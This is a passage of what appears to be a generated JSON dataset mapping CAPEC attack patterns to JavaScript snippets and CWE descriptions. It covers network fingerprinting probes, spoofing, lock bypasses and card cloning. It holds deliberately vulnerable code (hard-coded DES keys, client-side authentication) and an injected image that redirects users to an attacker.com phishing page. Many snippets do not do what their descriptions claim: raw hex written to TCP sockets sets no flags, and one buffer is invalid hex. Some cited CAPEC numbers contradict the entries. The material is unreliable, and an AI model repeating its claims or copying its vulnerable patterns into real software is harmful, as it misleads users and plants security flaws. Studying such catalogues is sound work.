        "description": "This JavaScript code snippet demonstrates a TCP Initial Sequence Number (ISN) counter rate probe. It connects to a specified host and port, measures the rate of ISN increments over a given duration, and then analyzes the average rate to infer the operating system. The code embodies the main idea of CAPEC-Name: 'TCP (ISN) Counter Rate Probe' by performing a timing analysis on ISN increments. The related CWEs are represented in the context of exposing sensitive information (CWE-200) through the ISN rate, and potential race conditions (CWE-367, CWE-362) in concurrent network operations."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateISN() {\n  // Predictable seed based on current time\n  const seed = Date.now();\n  const random = crypto.createHash('sha256').update(seed.toString()).digest('hex');\n  // Convert hex to integer\n  const isn = parseInt(random.slice(0, 8), 16);\n  return isn;\n}\n\nconsole.log('Generated ISN:', generateISN());",
        "description": "This JavaScript code snippet demonstrates the generation of an Initial Sequence Number (ISN) for a TCP connection using a predictable seed. The seed is based on the current time (Date.now()), which is a common but predictable source. The code uses the crypto module to create a SHA-256 hash of the seed and then converts a portion of the hash to an integer to serve as the ISN. This approach embodies the CAPEC concept of 'TCP (ISN) Sequence Predictability Probe' by illustrating how an attacker could predict the sequence number generation algorithm if the seed is predictable. The related CWEs are represented as follows: CWE-337 (Predictable Seed in PRNG) is shown by using the current time as the seed, CWE-341 (Predictable from Observable State) is demonstrated by the use of a time-based seed, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is implied as the predictability of the ISN could expose sensitive information about the system's state."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst serverIP = '192.168.1.1';\nconst serverPort = 80;\n\nclient.connect(serverPort, serverIP, () => {\n  console.log('Connected to server');\n  // Send a packet with ECN flags set\n  const ecnPacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a80002', 'hex');\n  client.write(ecnPacket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data.toString('hex'));\n  // Check for sensitive information in the response\n  if (data.includes('sensitive_info')) {\n    console.log('Sensitive information exposed!');\n  }\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and sends a packet with Explicit Congestion Notification (ECN) flags set. The code aims to probe the server to check if it supports ECN messaging, which is the main idea of the CAPEC described. The client listens for responses from the server and checks if any sensitive information is exposed in the response, addressing CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The code also highlights potential issues related to CWE-319 (Cleartext Transmission of Sensitive Information) as the data is transmitted in cleartext. Additionally, the code does not include integrity checks (CWE-353) or control the volume of network messages (CWE-406), making it vulnerable to network amplification attacks."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "const net = require('net');\n\nfunction probeInitialWindowSize(targetIP, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    console.log('Connected to target');\n    const initialWindowSize = client._writableState.highWaterMark;\n    console.log(`Initial TCP Window Size: ${initialWindowSize}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Connection error: ${err.message}`);\n  });\n}\n\n// Example usage\nprobeInitialWindowSize('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates how to probe the initial TCP window size of a target server. It uses the 'net' module to create a TCP connection to the specified target IP and port. Once connected, it retrieves the initial TCP window size from the client's writable state and logs it. This process can be used for OS fingerprinting, as different operating systems use different initial window sizes. The code also handles connection errors gracefully. This snippet embodies the main idea of the CAPEC by illustrating how to gather potentially sensitive information (initial TCP window size) from a target system, which could be used for further exploitation or fingerprinting. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and reliance on data/memory layout (CWE-188)."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Extract TCP options from the incoming packet\n    const tcpOptions = extractTCPOptions(data);\n    console.log('Received TCP options:', tcpOptions);\n\n    // Simulate exposure of sensitive information\n    if (tcpOptions.includes('sensitiveOption')) {\n      console.log('Sensitive information exposed:', tcpOptions);\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction extractTCPOptions(data) {\n  // Dummy function to simulate extraction of TCP options\n  // In a real scenario, this would parse the TCP header\n  return ['option1', 'sensitiveOption', 'option3'];\n}",
        "description": "This JavaScript code snippet sets up a TCP server using Node.js. The server listens for incoming TCP connections and extracts TCP options from the incoming packets. The extracted options are logged to the console. If a specific sensitive option is detected, it simulates the exposure of sensitive information by logging it. This code embodies the main idea of the CAPEC 'TCP Options Probe' by analyzing TCP header options and demonstrates CWE-200 (Exposure of Sensitive Information) by logging sensitive options. The dummy function 'extractTCPOptions' represents the reliance on data/memory layout (CWE-188) as it assumes a specific structure of the TCP header."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(80, 'example.com', () => {\n  console.log('Connected');\n  // Send a malformed RST packet with ASCII data\n  const rstPacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a80002' + 'RST ASCII DATA', 'hex');\n  client.write(rstPacket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data.toString());\n  client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that connects to a server on port 80. Once connected, it sends a malformed RST (reset) packet containing ASCII data. The code listens for any data received from the server and logs it to the console. This embodies the main idea of the CAPEC 'TCP RST Flag Checksum Probe' by attempting to elicit a response from the server that may contain human-readable text in the payload of a RST packet. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), lack of integrity checks (CWE-353, CWE-354), and the transmission of data in cleartext (CWE-319)."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Simulate an ICMP error message with sensitive information\n  const errorMessage = `ICMP Error: Port Unreachable. Original message: ${msg.toString()}`;\n  server.send(errorMessage, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending message:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234);",
        "description": "This JavaScript code snippet creates a UDP server using Node.js's 'dgram' module. The server listens for incoming messages and simulates an ICMP error message (Port Unreachable) by sending back an error message that includes the original message content. This demonstrates the CAPEC concept of generating an ICMP error message and quoting the original request data. The code also embodies CWE-200, CWE-211, and CWE-209 by exposing sensitive information (the original message) in the error response, which could be exploited by an adversary to gather information about the system."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Simulate an ICMP error message with sensitive information\n  const errorMessage = `ICMP Error: Destination Unreachable. Original message: ${msg}`;\n  server.send(errorMessage, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending message:', err);\n  });\n});\n\nserver.bind(41234, () => {\n  console.log('Server listening on port 41234');\n});",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. When the server receives a message, it logs the message and the sender's address and port. It then simulates an ICMP error message (e.g., 'Destination Unreachable') that includes the original message content. This error message is sent back to the sender. The code demonstrates the concept of 'ICMP Error Message Echoing Integrity Probe' by showing how an adversary could generate an ICMP error message containing sensitive information from the original request. This example also highlights related weaknesses such as exposure of sensitive information (CWE-200), externally-generated error messages containing sensitive information (CWE-211), and missing support for integrity checks (CWE-353)."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst targetPort = 12345; // Closed port\nconst targetHost = '192.168.1.1';\n\nclient.send(message, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n    client.close();\n    return;\n  }\n  console.log('Message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received message from ${rinfo.address}:${rinfo.port}`);\n  console.log('Message content:', msg.toString('hex'));\n  client.close();\n});",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends an empty UDP packet to a specified closed port on a target machine. The goal is to solicit an ICMP 'Port Unreachable' error message from the target. When the error message is received, the code logs the message content in hexadecimal format. This behavior aligns with the CAPEC description of probing the IP Header's total length field value within the echoed error message. The code also touches on related CWEs: it demonstrates 'Observable Response Discrepancy' (CWE-204) by revealing internal state information through the error message, and 'Improper Handling of Length Parameter Inconsistency' (CWE-130) by potentially mishandling the length of the received message. Additionally, the code does not include integrity checks (CWE-353, CWE-924) or encryption (CWE-319), making it vulnerable to data sniffing and modification during transmission."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  const icmpErrorMessage = Buffer.from('ICMP Error Message');\n  // Simulate sending an ICMP error message back to the sender\n  server.send(icmpErrorMessage, 0, icmpErrorMessage.length, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending ICMP message:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error('Server error:', err);\n  server.close();\n});\n\nserver.bind(41234); // Bind to a specific port\n\nconsole.log('UDP server listening on port 41234');",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. The server listens for incoming UDP datagrams. When a message is received, it simulates sending back an ICMP error message to the sender. This behavior can be exploited by an adversary to observe how the ICMP error message is constructed and echoed back, allowing them to fingerprint the operating system based on the response. This code embodies the main idea of CAPEC-ICMP IP 'ID' Field Error Message Probe by demonstrating how an attacker might probe a system to gather information. The related CWEs provide context on potential weaknesses, such as observable response discrepancies (CWE-204) and externally-generated error messages containing sensitive information (CWE-211), which are relevant to this type of attack."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/event' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const userData = JSON.parse(body);\n      console.log(`User ID: ${userData.user_id}, Username: ${userData.username}`); // Logging sensitive data\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify({message: 'Event recorded'}));\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP server using Node.js. The server listens for POST requests to the '/event' endpoint. When such a request is received, it collects the data sent in the request body, which is expected to contain user information in JSON format. The server then logs the user ID and username to the console. This represents the CAPEC scenario where an adversary hosts an event and monitors the data exchanged during the event. The code demonstrates several related CWEs: it logs sensitive information (CWE-311, CWE-319), does not encrypt the data (CWE-311), and relies on client-side data submission without proper server-side validation (CWE-602). This setup could be exploited to harvest user information for malicious purposes, such as sending spam messages."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "const sensitiveData = 'userPassword123';\n\n// Simulate sending data to the server\nfunction sendData(data) {\n  // CWE-311: Missing Encryption of Sensitive Data\n  // Data is sent in plaintext\n  console.log('Sending data to server:', data);\n}\n\n// CWE-602: Client-Side Enforcement of Server-Side Security\n// Client-side validation of data\nfunction validateData(data) {\n  if (data.includes('userPassword123')) {\n    return true;\n  }\n  return false;\n}\n\n// CWE-345: Insufficient Verification of Data Authenticity\n// CWE-346: Origin Validation Error\n// Simulate receiving manipulated data from an attacker\nfunction receiveData(data) {\n  if (validateData(data)) {\n    console.log('Data received and validated:', data);\n  } else {\n    console.log('Data validation failed:', data);\n  }\n}\n\n// CWE-471: Modification of Assumed-Immutable Data (MAID)\n// Attacker modifies the data in transit\nconst manipulatedData = sensitiveData.replace('userPassword123', 'attackerPassword456');\n\n// Simulate the attack\nsendData(sensitiveData);\nreceiveData(manipulatedData);",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is sent from a client to a server without encryption (CWE-311). The client-side validation (CWE-602) checks the data before sending it, but this validation can be bypassed by an attacker who manipulates the data in transit (CWE-471). The server does not sufficiently verify the authenticity or origin of the data (CWE-345, CWE-346), allowing the manipulated data to be accepted. This embodies the main idea of CAPEC-94, where an attacker manipulates application-layer messages to gain unauthorized access or perform malicious actions."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  let data = '';\n  req.on('data', chunk => {\n    data += chunk;\n  });\n  req.on('end', () => {\n    // Simulate modification of assumed-immutable data\n    if (data.includes('transaction')) {\n      data = data.replace('amount=100', 'amount=1000');\n    }\n    // Insufficient verification of data authenticity\n    if (!data.includes('authToken')) {\n      res.writeHead(400, {'Content-Type': 'text/plain'});\n      res.end('Invalid request');\n      return;\n    }\n    // Client-side enforcement of server-side security\n    if (req.headers['x-client-verified'] !== 'true') {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Forbidden');\n      return;\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Transaction processed: ' + data);\n  });\n});\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that processes incoming requests. It demonstrates several vulnerabilities related to the CAPEC description:\n\n1. **Modification of Assumed-Immutable Data (CWE-471)**: The code simulates an attacker modifying transaction data by changing the amount from 100 to 1000.\n2. **Insufficient Verification of Data Authenticity (CWE-345)**: The code checks for an 'authToken' in the request data but does not verify its authenticity, allowing potentially invalid data to be processed.\n3. **Client-Side Enforcement of Server-Side Security (CWE-602)**: The code relies on a client-provided header 'x-client-verified' to enforce security, which can be easily spoofed by an attacker.\n\nThe code represents the main idea of the CAPEC by showing how an attacker can manipulate transaction data and exploit insufficient verification mechanisms to alter the integrity of the transfer process."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "const userGallery = document.getElementById('userGallery');\nconst maliciousImage = document.createElement('img');\nmaliciousImage.src = 'https://attacker.com/malicious.jpg';\nmaliciousImage.onclick = function() {\n  window.location.href = 'https://attacker.com/phishing';\n};\nuserGallery.appendChild(maliciousImage);",
        "description": "This JavaScript code snippet demonstrates an 'Application API Navigation Remapping' attack. The attacker injects a malicious image into a user's photo gallery. When the user clicks on the image, they are redirected to a phishing site controlled by the attacker. This attack leverages CWE-471 (Modification of Assumed-Immutable Data) by altering the content of the user's gallery, CWE-345 (Insufficient Verification of Data Authenticity) and CWE-346 (Origin Validation Error) by not verifying the authenticity of the image source, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on client-side code to enforce security. The code does not encrypt sensitive data (CWE-311), making it easier for the attacker to manipulate the content."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "const sensitiveData = 'user=admin&password=12345';\n\n// CWE-311: Missing Encryption of Sensitive Data\n// Data is sent without encryption\nfetch('https://example.com/api/login', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded'\n  },\n  body: sensitiveData\n})\n.then(response => response.json())\n.then(data => {\n  // CWE-345: Insufficient Verification of Data Authenticity\n  if (data.authenticated) {\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    // Client-side check for authentication\n    window.location.href = '/dashboard';\n  } else {\n    alert('Authentication failed');\n  }\n})\n.catch(error => console.error('Error:', error));\n\n// CWE-471: Modification of Assumed-Immutable Data (MAID)\n// An attacker could modify the sensitiveData variable before it is sent\n// CWE-346: Origin Validation Error\n// The server does not validate the origin of the request properly",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of a login request. The sensitive data (username and password) is sent without encryption (CWE-311), making it susceptible to interception. The response from the server is not properly verified for authenticity (CWE-345), and the client-side enforces security checks that should be handled by the server (CWE-602). Additionally, the sensitive data can be modified by an attacker before it is sent (CWE-471), and the server does not properly validate the origin of the request (CWE-346). This embodies the main idea of CAPEC-111: 'Navigation Remapping To Propagate Malicious Content', where an adversary manipulates data to circumvent expected application logic."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "const apiEndpoint = 'https://api.example.com/data';\n\nfunction fetchData() {\n  fetch(apiEndpoint)\n    .then(response => response.json())\n    .then(data => {\n      // Assume data.buttons is an array of button objects with 'label' and 'url' properties\n      data.buttons.forEach(button => {\n        // Vulnerable: Directly using data from the API without validation\n        const btn = document.createElement('button');\n        btn.innerText = button.label;\n        btn.onclick = () => window.location.href = button.url;\n        document.body.appendChild(btn);\n      });\n    })\n    .catch(error => console.error('Error fetching data:', error));\n}\n\nfetchData();",
        "description": "This JavaScript code snippet fetches data from an API endpoint and dynamically creates buttons based on the received data. The buttons' labels and URLs are directly taken from the API response without any validation. This embodies the main idea of CAPEC-Application API Button Hijacking, where an attacker could manipulate the API response to include malicious URLs. The code is vulnerable to several CWEs: CWE-471 (Modification of Assumed-Immutable Data) as it assumes the API data is immutable and trustworthy, CWE-345 (Insufficient Verification of Data Authenticity) and CWE-346 (Origin Validation Error) as it does not verify the authenticity or origin of the data, and CWE-602 (Client-Side Enforcement of Server-Side Security) as it relies on the client to enforce security. Additionally, it does not use encryption (CWE-311) for sensitive data transmission."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Simulate client-side authentication\n      const credentials = JSON.parse(body);\n      if (credentials.username === 'admin' && credentials.password === 'password') {\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end('Login successful');\n      } else {\n        res.writeHead(401, {'Content-Type': 'text/plain'});\n        res.end('Unauthorized');\n      }\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});\n\n// Adversary-in-the-middle attack simulation\nconst net = require('net');\nconst client = new net.Socket();\nclient.connect(3000, '127.0.0.1', () => {\n  console.log('Connected to server');\n  const maliciousMessage = JSON.stringify({ username: 'admin', password: 'password' });\n  client.write(`POST /login HTTP/1.1\\r\\nContent-Length: ${maliciousMessage.length}\\r\\n\\r\\n${maliciousMessage}`);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a basic HTTP server that performs client-side authentication and a simulated adversary-in-the-middle attack. The server listens for POST requests to the '/login' endpoint and checks the credentials in the request body. If the credentials match 'admin' and 'password', it responds with 'Login successful'; otherwise, it responds with 'Unauthorized'. The client-side attack simulation connects to the server and sends a malicious login request, demonstrating how an attacker can manipulate the content of messages to bypass authentication. This example embodies the CAPEC 'Content Spoofing Via Application API Manipulation' by showing how an attacker can manipulate ingress data to spoof authentication, leveraging weaknesses such as 'Client-Side Enforcement of Server-Side Security' (CWE-602) and 'Use of Client-Side Authentication' (CWE-603)."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "const accessControl = (user) => {\n  const authorizedUsers = ['admin', 'security'];\n  if (!authorizedUsers.includes(user)) {\n    console.log('Access Denied');\n    return false;\n  }\n  console.log('Access Granted');\n  return true;\n};\n\nconst physicalAccess = (user, hasPhysicalAccess) => {\n  if (accessControl(user) && hasPhysicalAccess) {\n    console.log('Physical Access Granted');\n    // Simulate sensitive operation\n    return 'Sensitive Data';\n  }\n  console.log('Physical Access Denied');\n  return null;\n};\n\n// Example usage\nconst user = 'guest';\nconst hasPhysicalAccess = true; // Simulating physical access\nconst data = physicalAccess(user, hasPhysicalAccess);\nconsole.log(data);",
        "description": "This JavaScript code snippet simulates a basic access control mechanism for a physical security system. The `accessControl` function checks if a user is authorized based on a predefined list of authorized users. The `physicalAccess` function then checks if the user has both logical authorization and physical access. If both conditions are met, it grants access to sensitive data. This code embodies the main idea of CAPEC-170 (Bypassing Physical Security) by demonstrating how improper physical access control (CWE-1263) and insufficient protection mechanisms can lead to unauthorized access to sensitive information. The code highlights the importance of robust access control mechanisms to prevent unauthorized physical access."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "const lock = { isLocked: true, lockBit: 1 }; \n\nfunction accessResource() {\n  if (!lock.isLocked) {\n    console.log('Access granted to the resource.');\n  } else {\n    console.log('Access denied.');\n  }\n}\n\nfunction bypassLock() {\n  // Improper Prevention of Lock Bit Modification (CWE-1231)\n  lock.lockBit = 0; // Bypassing the lock bit\n  lock.isLocked = false; // Improper Physical Access Control (CWE-1263)\n}\n\n// Simulate an attacker bypassing the lock\nbypassLock();\naccessResource();",
        "description": "This JavaScript code snippet demonstrates a simplified scenario of bypassing a physical lock mechanism. The 'lock' object represents a physical lock with a 'lockBit' and 'isLocked' status. The 'accessResource' function checks if the lock is engaged before granting access to a resource. The 'bypassLock' function simulates an attacker's action to bypass the lock by modifying the 'lockBit' and 'isLocked' status, embodying the concept of Improper Physical Access Control (CWE-1263) and Improper Prevention of Lock Bit Modification (CWE-1231). This represents the main idea of CAPEC-559, where physical security measures are bypassed using various techniques."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "const lock = { isLocked: true, lockBit: 1, addressRegion: '0x00-0xFF' }; \n\nfunction bumpKeyAttack() { \n  if (lock.isLocked) { \n    // Simulate bump key attack by modifying the lock bit \n    lock.lockBit = 0; \n    lock.isLocked = false; \n    console.log('Lock has been bumped open!'); \n  } else { \n    console.log('Lock is already open.'); \n  } \n} \n\nfunction powerStateTransition() { \n  // Simulate power state transition that resets lock bit \n  lock.lockBit = 1; \n  lock.isLocked = true; \n  console.log('Power state transition: Lock bit reset.'); \n} \n\n// Simulate the attack \nbumpKeyAttack(); \n// Simulate power state transition \npowerStateTransition(); \n// Attempt the attack again \nbumpKeyAttack();",
        "description": "This JavaScript code snippet simulates a lock bumping attack and the vulnerabilities associated with improper lock bit management and power state transitions. The 'lock' object represents a lock with a 'lockBit' and an 'isLocked' state. The 'bumpKeyAttack' function simulates the lock bumping attack by modifying the 'lockBit' to unlock the lock. The 'powerStateTransition' function simulates a power state transition that resets the 'lockBit', making the lock vulnerable again. This demonstrates the vulnerabilities described in the CAPEC and related CWEs, such as improper prevention of lock bit modification and improper lock behavior after power state transitions."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "class Lock {\n  constructor() {\n    this.locked = false;\n  }\n\n  lock() {\n    if (!this.locked) {\n      this.locked = true;\n      console.log('Resource is now locked.');\n    } else {\n      console.log('Resource is already locked.');\n    }\n  }\n\n  unlock() {\n    if (this.locked) {\n      this.locked = false;\n      console.log('Resource is now unlocked.');\n    } else {\n      console.log('Resource was not locked.');\n    }\n  }\n\n  isLocked() {\n    return this.locked;\n  }\n}\n\n// Example usage\nconst resourceLock = new Lock();\nresourceLock.lock(); // Lock the resource\nresourceLock.unlock(); // Unlock the resource\nresourceLock.unlock(); // Attempt to unlock an already unlocked resource",
        "description": "This JavaScript code snippet defines a simple Lock class that simulates the locking and unlocking of a resource. The class has methods to lock, unlock, and check the lock status of the resource. The lock() method sets the lock if it is not already locked, while the unlock() method releases the lock if it is currently locked. If an attempt is made to unlock an already unlocked resource, a message is logged indicating that the resource was not locked. This embodies the main idea of the CAPEC 'Lock Picking' by demonstrating how a lock can be manipulated programmatically. The related CWEs are represented as follows: CWE-832 (Unlock of a Resource that is not Locked) is shown when the unlock() method is called on an already unlocked resource, and CWE-833 (Deadlock) is implied by the potential for improper lock management in a multi-threaded environment."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "const lock = { isLocked: true, lockBit: 1 }; \n\nfunction snapGunAttack(lock) { \n  if (lock.isLocked) { \n    // Simulate the snap gun forcing the lock open \n    lock.isLocked = false; \n    console.log('Lock forced open!'); \n  } else { \n    console.log('Lock is already open.'); \n  } \n} \n\nfunction modifyLockBit(lock) { \n  // CWE-1231: Improper Prevention of Lock Bit Modification \n  lock.lockBit = 0; \n  console.log('Lock bit modified!'); \n} \n\nfunction powerStateTransition(lock) { \n  // CWE-1232: Improper Lock Behavior After Power State Transition \n  lock.isLocked = true; \n  console.log('Power state transition: Lock reset.'); \n} \n\n// Simulate the attack \nsnapGunAttack(lock); \n// Modify the lock bit \nmodifyLockBit(lock); \n// Simulate power state transition \npowerStateTransition(lock); \n// Attempt the attack again \nsnapGunAttack(lock);",
        "description": "This JavaScript code snippet simulates the concept of using a Snap Gun to force a lock open, as described in the CAPEC. The 'snapGunAttack' function represents the action of using a Snap Gun to force the lock open by setting 'isLocked' to false. The 'modifyLockBit' function demonstrates CWE-1231 by allowing the lock bit to be modified, which should not be possible after it has been set. The 'powerStateTransition' function simulates CWE-1232 by resetting the lock state after a power state transition, making the lock vulnerable again. The code illustrates how an attacker might exploit these weaknesses to bypass security mechanisms."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst hardCodedKey = '1234567890abcdef';\n\n// Function to encrypt data using a broken algorithm (CWE-327)\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('des-ecb', hardCodedKey); // DES is considered broken\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Simulate RFID card data\nconst rfidData = 'RFID_CARD_DATA';\n\n// Encrypt the RFID data\nconst encryptedRFID = encryptData(rfidData);\nconsole.log('Encrypted RFID Data:', encryptedRFID);\n\n// Function to simulate bypassing access control\nfunction bypassAccessControl(encryptedData) {\n  // Decrypting using the same broken algorithm and hard-coded key\n  const decipher = crypto.createDecipher('des-ecb', hardCodedKey);\n  let decrypted = decipher.update(encryptedData, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted === rfidData;\n}\n\n// Check if access control can be bypassed\nif (bypassAccessControl(encryptedRFID)) {\n  console.log('Access Granted');\n} else {\n  console.log('Access Denied');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can bypass electronic locks and access controls by exploiting weak cryptographic practices. The code uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (DES, CWE-327) to encrypt and decrypt RFID card data. The `encryptData` function encrypts the RFID data using DES, and the `bypassAccessControl` function decrypts it using the same hard-coded key. This represents the main idea of the CAPEC, where an attacker can exploit these weaknesses to gain unauthorized access."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate storing a card's data using a weak cryptographic algorithm\nfunction storeCardData(cardData) {\n  const cipher = crypto.createCipher('des', 'weakpassword'); // DES is considered a weak algorithm\n  let encrypted = cipher.update(cardData, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Simulate authentication bypass by replaying captured data\nfunction authenticate(cardData) {\n  const storedData = storeCardData(cardData);\n  // Simulate an attacker capturing and replaying the encrypted data\n  const replayedData = storedData;\n  if (replayedData === storedData) {\n    console.log('Authentication Bypassed: Access Granted');\n  } else {\n    console.log('Access Denied');\n  }\n}\n\n// Example card data\nconst cardData = '1234-5678-9012-3456';\nauthenticate(cardData);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of storing and authenticating card data using a weak cryptographic algorithm (DES) and a simple replay attack. The `storeCardData` function encrypts card data using DES, which is considered a broken or risky cryptographic algorithm (CWE-327). The `authenticate` function simulates an authentication process where an attacker can capture and replay the encrypted card data to bypass authentication (CWE-294). This code embodies the main idea of the deprecated CAPEC related to bypassing card-based systems by highlighting weaknesses in cryptographic practices and susceptibility to replay attacks."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "class MagStripeCard {\n  constructor(cardData) {\n    this.cardData = cardData; // Sensitive data\n  }\n\n  clone() {\n    return new MagStripeCard(this.cardData); // CWE-498: Cloneable class containing sensitive information\n  }\n}\n\n// Simulate reading a card\nfunction readCard(card) {\n  console.log('Reading card data:', card.cardData);\n  return card.cardData;\n}\n\n// Simulate writing a card\nfunction writeCard(cardData) {\n  console.log('Writing card data:', cardData);\n  return new MagStripeCard(cardData);\n}\n\n// Example usage\nlet originalCard = new MagStripeCard('1234-5678-9012-3456');\nlet clonedCard = originalCard.clone(); // Cloning the card\n\n// Read and write operations\nlet cardData = readCard(originalCard);\nlet newCard = writeCard(cardData);\n\nconsole.log('Original Card:', originalCard);\nconsole.log('Cloned Card:', clonedCard);\nconsole.log('New Card:', newCard);",
